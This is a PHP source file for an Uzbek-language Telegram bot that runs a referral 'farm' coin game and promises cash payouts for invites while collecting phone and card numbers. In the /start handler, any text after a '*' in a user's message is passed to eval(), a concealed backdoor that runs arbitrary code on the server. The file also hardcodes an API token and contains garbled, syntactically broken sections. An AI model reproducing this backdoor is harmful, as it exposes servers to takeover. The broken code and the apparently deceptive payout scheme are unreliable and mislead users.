<?php
ob_start();
define('API_KEY','1154364363:AAFEZieGPTYqozHYkpGj4XSzOOFCNHLIgNk');
$admin = "1074253237"; //admin id
$kanalimz ="@@Adabiyot_va_ona_tili_group"; //kanal useri
$bot = "@Fermauzrobot"; //botizi userini yozing 

//Kod [@Clay_haker] tomonidan garov maqsadida 30 daqiqada yozildi hato va kamchiliklar uchun uzr//
 
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }


function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";
$folder3 = "tanga";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by ');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by @NONAME_HACKER');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}


$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"💲 Sotuvga qo`yish 💲"]],[['text'=>"📥 Hayvon Sotib olish 📥"]],[['text'=>"🌱 Ozuqa sotib olish 🌱"]],[['text'=>"🐮Savdo qilish🐮"]]
[['text'=>"📃 Ferma tashkil qilish 📃"]],[['text'=>"💰 Foyda olish 💰"]],
[['text'=>"💻 Admin 💻"],['text'=>"💸 To`lov olish 💸"]],[['text'=>"📈 Statistika 📈"],[['text'=>" 🐑 Mening Fermam 🐑"]],['text'=>"🎉 Tavsiya qilamiz 🎉"]]]
]);


$balinfo = "*👋 Salom* [$name](tg://user?id=$cid) *botimizga xush kelibsiz siz bu bot orqali 🐔 Ferma 🐥 qurib uni rivojlantirib sotishingiz mumkin va sotib yuborgan fermalaringiz soni 10 tadan oshsa sizga 100 tanga beriladi siz uni naqd UZS ga alishtirishingiz mumkin.\n\n
	❗ Botdan foydalanish uchun $kanalimz kanaliga obuna bo'lishingiz kerak.*";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"$balinfo",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){
  
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz botdan bu usulda foydalana olmaysiz!",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.dat");
      $usr = $usr + 15;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'text'=>"Sizga taklifingiz uchun 15 tanga bonus taqdim etildi!",
'reply_markup'=>$key
      ]);
file_put_contents("coin/$cid.dat", "0");
bot('sendMessage',[
'chat_id'=>$refid,
'text'=>"Sizga 15 tanga berilishi kerak edi.Lekin taklif qilgan do'stingiz $kanalimz kanaliga a'zo bo'lmaganligi sababli berilmadi!",
]);
    }
  }
}
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}
}
if($tx == "💰 Foyda Olish 💰"){
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz taklif qilgan odamlar soni - $odam ta \n\n Sizning USSD mablag'ingiz $ball ni tashkil etadi. Bu tangalardan ko'proq to'plang va USSD tangangizni naqd UZS pulga alishtiring!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key, 
      ]);
    }
if($tx=="🌱 Ozuqa sotib olish 🌱"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("ozuqa.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🌱 Sizda hozircha $ab ta ozuqa mavjud \n\n 💰 Yana sotib olasizmi ? ? ?",
        'reply_markup'=>$key
        ]);
}

if($tx=="💸 To`lov olish 💸"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Siz fermalaringizdan tushgan foydani pulga almashtirish uchun hisobingizda kamida 100 ta tanga mavjud bo`lishi zarur.So'ngra siz u tangalarni 20.000 so'm paynet yoki CLICK orqali to'lovni olishingiz mumkin bo'ladi.\n\n
/tolov so'zidan so'ng Telefon raqamingiz va summani yozing.

Masalan:

Telefonga To'lov qilish uchun:
/tolov +9989xXXXXXXX 20.000
CLICK orqali to'lov uchun esa /shot 8600 ******* namuna bo'yicha bajaring!",
'reply_markup'=>$key
        ]);
    
    
}
if($tx=="📈 Statistika 📈"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"👥Botimiz a`zolari $ab ta \n\n 💰 Jami Bajarilgan foyda: $sum so'mni tashkil etadi",
        'reply_markup'=>$key
        ]);
    
}
if(strpos($tx,"/tolov")!==false){
    $ex=explode(" ",$tx);
    $ab=file_get_contents("coin/$cid.dat");
    
    if( $ex[2]>=110 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("coin/$cid.dat","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");

$bb=substr($ex[1],0,6);
$hayv = "3 ta qo'y va 1 mol";
$gg="xx";
$ss=substr($ex[1],8,8);
  file_put_contents("$cid.t","🔯 Status - ✅ \n\n 🆔 Tolov id: $t \n\n  📞 Qabul qiluvchini raqami: \n\n $bb $gg $ss \n\n  💰 To'lov miqdori: $ex[2] sum");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Yaxshi ✅ $ex[1] Nomerga yoki CLICK hisobga $ex[2] so'm 48 soat davomida amalga oshiriladi buni $kanalimz kanalida ko'ring agar amalga oshirilmasa admin bilan bog'laning!!",
'reply_markup'=>$key
        ]);
        
        bot('sendmessage',[
            'chat_id'=>$admin,
            'text'=>"*Fermadan tushgan foydani olish uchun zakaz tushdi * \n` FERMER haqida ma'lumot\n id raqami $cid\n username: @$user \n Ismi: `[$name](tg://user?id=$cid) \n *To'lanadigan pul miqdori:$ex[2] soʼm  \n Raqami: $ex[1] \n\n Tolov bajarildimi amalga oshirilgan bo`lsa /toʼlandi=$cid shunday deb yozing!!* ",
            'disable_web_page_preview'=>true,
            'parse_mode'=>markdown,
            ]);
          
}else{bot('sendmessage',['chat_id'=>$cid,'text'=>"Siz o'z hisobingizga toʼlov amalga oshirolmaysiz sababi sizning hisobingizda $ball tanga mavjud tangalaringiz sonini 100 taga olib boring va to'lovni amalga oshiravering!"


if($tx=="💻 Admin 💻"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"👤Bot Admini: @NONAME_HACKER\n
🔱 Kanal: $kanalimz\n
⏰ Ish Vaqti: Chegaralanmagan",
        'reply_markup'=>$key
        ]);
    
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "📃 Ferma tashkil qilish 📃"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Siz avval ferma tashkil qilish uchun fermangizga odam taklif qiling va so'ng tashkil qilish imkoniyatiga ega bo'ling. Sizning odam taklifi uchun Ssilkangiz : https://t.me/$bot?start=$cid\n\n Buni do'stlarga tarqating va shu ssilka orqali kirgan har bir odam uchun 15 tangaga ega bo'ling va ferma oching.",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }
if((stripos($tx,"/addball")!==false) and $cid == $admin){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
      $usr += $ex[2];
      file_put_contents("coin/$refid.dat", "$usr");
      }
    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Adminga xabar yuborish uchun kichkina eslatma Yuboriladigan xabarni kiriting. Xabar turi markdown";

    
    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Avval $kanalimz ga a'zo bo'ling va keyin bizning FERMERLAR safiga qo'shila olasiz!          Hurmat bilan [@NONAME_HACKER].",
    ]);
  }

}if(strpos($tx,"/tolandi=")!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-100_kanaliz_Idsi";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"Kanalga tashlandi!!"
        ]);
}
$reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true,
        ]);
if($tx=="/admin" and $cid==$admin){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Foydali menyuni tahrirlash uchun text kiriting",
        'reply_markup'=>$reply_menu,
'parse_mode'=>markdown,
   'disable_web_page_preview'=>true,
        ]);
    
}
$sreply = $message->reply_to_message->text;
if($sreply=="Foydali menyuni tahrirlash uchun text kiriting"){
    file_put_contents("foydali.txt","$tx");
    $ab=file_get_contents("foydali.txt");
      
    bot('sendmessag
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[ e',[
        'chat_id'=>$admin,
        'text'=>"$ab
 Sizni menyu tahrirlaganingiz omadli ravishda amalga oshdi",
        'parse_mode'=>markdown,
'reply_markup'=>$key
        ]);
    
    
}
if($tx=="🎉 Tavsiya qilamiz 🎉"){
$ab=file_get_contents("foydali.txt");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"$ab",
'parse_mode'=>markdown,
'reply_markup'=>$key
]);

// kerakli knopkalar

if($tx == "💲 Sotuvga qo`yish 💲")!==false) and $cid == $admin) {
      'chat_id'=>$cid,
      'text'=>"Siz sotuvga qo'ymoqchi bo'lgan fermangizni tanlang: $ferma , $ferma2 , $ferma3 , $ferma4 , $ferma5 , $ferma6 , $ferma7 , $ferma8 va tanlab bo'lganingizdan so'ng botga /ferma deb yuboring",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key, 
      ]);
    }
if($tx == "/ferma" and $cid == $admin or $member or $creator){
      ty($ch);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Fermangizni nomini kiriting : ",
      'reply_markup'=>$ferma
      'reply_answer'=>$message 
      'text=>"$ferma *Fermangiz qabul qilindi va sotuvga qoyildi sotib olishsa sizga xabar keladi!* _ biror muammo bolsa adminimiz _ [@NONAME_HACKER] "
      ]);
}
if($tx == "📥 Hayvon Sotib olish 📥")!==false) and $cid == $admin) {
      'chat_id'=>$cid,
      'text'=>"Sizda hozircha $hayv mavjud ekan demak siz hozircha hayvon sotib olmaysiz ! ! !",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key, 
      ]);
}
if($tx == "🐑 Mening Fermam 🐑")!==false) and $cid == $admin) {!==false and check) and $ball)
      'chat_id'=>$cid,
      'text'=>"Sizda hozircha ferma yoq botda faolroq boling va ferma uchun koproq tanga yiging batafsil $kanalimz orqali bilib olishingizni sorab qolamiz",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key, 
      ]); 

}
$step = file_get_contents("azouzb/$cid.step");
$orqa = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>" Orqaga qaytish"]]]
]);
if($tx == "/send" and $cid == $admin){
      ty($ch);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>" Matni kiriting",
      'reply_markup'=>$orqa
      ]);
      file_put_contents("coin/$cid.step","send");
    }
    if($step == "send" and $cid == $admin){
      ty($ch);
      if($tx == " Orqaga"){
      del("coin/$cid.step");
      }else{
      ty($cid);
$idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
      unlink("coin/$cid.step");
      }
    }
    if($tx==" Orqaga"){
        bot('sendmessage',[
            'chat_id'=>$cid,
            'text'=>" Siz orqaga qaytdingiz!",
            'reply_markup'=>$key
            ]);
        
    }
    
    
?>
